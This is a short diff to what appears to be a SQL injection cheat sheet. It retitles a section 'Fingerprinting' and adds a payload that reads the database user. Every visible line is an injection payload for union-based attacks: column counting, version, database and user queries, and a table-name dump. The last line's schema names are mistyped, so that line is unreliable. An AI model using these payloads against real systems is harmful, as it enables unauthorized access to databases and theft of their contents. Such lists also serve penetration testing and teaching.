@@ -40,11 +40,10 @@ After stuffing the input fields you should either obtain access to the system as
 # Get number of columns
 ' ORDER BY 3--
 
-# Get version, make shorter/longer depending on number of columns
+# Fingerprinting
 ' UNION SELECT 1, VERSION(), 3--
-
-# Get DB name
 ' UNION SELECT 1,2, DATABASE()--
+' UNION SELECT 1,2, USER()--
 
 # Get table name
 ' UNION ALL SELECT 1,2, GROUP_CONCAT(table_name) FROM information.schema.tables WHERE table.schema="<DATABASE>"--
